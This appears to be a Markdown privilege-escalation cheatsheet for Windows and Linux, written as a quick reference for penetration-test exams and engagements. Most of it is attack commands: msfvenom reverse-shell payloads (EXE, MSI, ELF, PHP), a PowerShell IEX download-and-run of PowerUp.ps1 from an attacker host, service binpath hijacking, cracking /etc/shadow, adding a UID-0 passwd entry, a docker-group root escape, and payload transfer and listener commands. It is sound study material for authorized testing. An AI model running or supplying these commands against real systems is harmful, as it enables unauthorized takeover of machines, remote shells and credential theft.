# Master Privilege Escalation Cheatsheet

> One-page mental model + command reference for both Windows and Linux. Use this as your **exam-day / engagement-day quick reference** after you've studied the detailed notes elsewhere in this repo.

---

## The Universal Privilege Escalation Question

No matter the OS, every privesc technique answers one question:

> **"Is there something that runs with higher privileges than me, and can I influence what it trusts or executes?"**

That "something" is always one of these four categories:

| Category | Windows Example | Linux Example |
|---|---|---|
| **A file it executes** | Unquoted service path, DLL hijack | Writable cron script, writable SUID binary |
| **A configuration it trusts** | Registry `AlwaysInstallElevated`, service `binPath` | `/etc/sudoers`, `/etc/passwd` |
| **A credential/token it exposes** | `SeImpersonatePrivilege` + Potato exploits | SSH keys, cached credentials |
| **An environment it inherits** | Environment variables for scheduled tasks | `PATH` hijacking, `LD_PRELOAD` |

---

## Windows PrivEsc — Fast Reference

### Step 0: Who am I?
```powershell
whoami
whoami /priv       # look for SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege, SeTakeOwnershipPrivilege — instant-win tokens
whoami /groups
```

### Step 1: Automated enumeration (do this first on real engagements)
```powershell
winPEAS.exe
# or
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/PowerUp.ps1'); Invoke-AllChecks"
```

### Step 2: Manual checks if tools are blocked

| Check | Command |
|---|---|
| Unquoted service paths | `wmic service get name,pathname \| findstr /v /i "system32" \| findstr /v \"` |
| Service permissions (even quoted) | `accesschk64.exe -uwcqv <ServiceName>` |
| Writable directories | `accesschk64.exe -uwdq "<Path>"` |
| Full service config | `sc qc <ServiceName>` |
| AlwaysInstallElevated | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` + same for `HKCU` |
| Scheduled tasks | `schtasks /query /fo LIST /v` |
| Stored/cached creds | `cmdkey /list`, check `C:\Users\*\AppData` for config files |
| Unattended install leftovers | `dir /s /b C:\*unattend*.xml C:\*sysprep.inf*` |

### Step 3: Exploit
```powershell
# Unquoted path: drop payload at the vulnerable stop, then:
net start <ServiceName>

# Weak service perms: reconfigure directly
sc config <ServiceName> binpath= "C:\payload.exe"
net start <ServiceName>

# AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi

# SeImpersonatePrivilege enabled → Potato family
PrintSpoofer64.exe -i -c cmd
```

---

## Linux PrivEsc — Fast Reference

### Step 0: Who am I?
```bash
id
whoami
groups
sudo -l
```

### Step 1: Automated enumeration
```bash
./linpeas.sh
# or
python3 linuxprivchecker.py
```

### Step 2: Manual checks

| Check | Command |
|---|---|
| SUID/SGID binaries | `find / -perm -u=s -type f 2>/dev/null` |
| World-writable files | `find / -perm -o+w -type f 2>/dev/null` |
| Readable/writable shadow | `ls -l /etc/shadow` |
| Writable passwd | `ls -l /etc/passwd` |
| Sudo rights | `sudo -l` |
| Cron jobs | `cat /etc/crontab; ls -la /etc/cron.d/` |
| Kernel/OS version (CVE lookup) | `uname -a; cat /etc/os-release` |
| Capabilities | `getcap -r / 2>/dev/null` |
| NFS no_root_squash shares | `cat /etc/exports` |
| Docker group membership | `groups` (if in `docker` group → root via `docker run -v /:/mnt ...`) |

### Step 3: Exploit by finding type

```bash
# SUID binary → check GTFOBins.github.io for that binary name
<binary> [args from GTFOBins]

# Readable /etc/shadow
cat /etc/shadow > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Writable /etc/shadow or /etc/passwd
openssl passwd -6 newpass
# edit shadow's root hash, OR append UID-0 line to passwd

# Sudo misconfig
sudo -l                     # find the allowed binary
# then check https://gtfobins.github.io/ for that binary's sudo bypass

# Cron: writable script
echo '...' >> /writable/cron_script.sh   # append malicious payload

# Cron: PATH hijack
echo $PATH                  # check for writable early directories
# place malicious file matching bare command name cron calls

# Docker group escape
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Payload Generation Cheatsheet (msfvenom)

| Target | Command |
|---|---|
| Windows EXE reverse shell | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe` |
| Windows MSI (AlwaysInstallElevated) | `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi` |
| Linux ELF reverse shell | `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -o shell.elf` |
| PHP web shell | `msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw -o shell.php` |

## Listener / Transfer Cheatsheet

```bash
# Listener
nc -lnvp <PORT>

# File hosting
python3 -m http.server 80

# Download on Windows target (PowerShell)
Invoke-WebRequest -Uri http://<IP>/file.exe -OutFile file.exe
certutil -urlcache -f http://<IP>/file.exe file.exe

# Download on Linux target
wget http://<IP>/file
curl -O http://<IP>/file
```

## Shell Stabilization (Linux, after a raw reverse shell)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, then on attacker:
stty raw -echo; fg
# then in the shell:
reset
```

---

## Golden Rules

1. **Enumerate before you exploit.** A rushed attacker misses the easy wins and reaches for exploits (loud, unreliable) when a misconfiguration (quiet, reliable) was sitting right there.
2. **Automated tools first, manual understanding always.** Run LinPEAS/winPEAS to save time, but know *why* each flagged item matters — tools get blocked, understanding doesn't.
3. **`whoami /priv` (Windows) and `sudo -l` (Linux) are the highest-value first commands** — check them before any deep filesystem sweep.
4. **GTFOBins.github.io is your best friend** for both SUID and sudo-allowed-binary abuse on Linux.
5. **Document everything as you go** — screenshot commands and output live; don't try to reconstruct your steps afterward for a report.
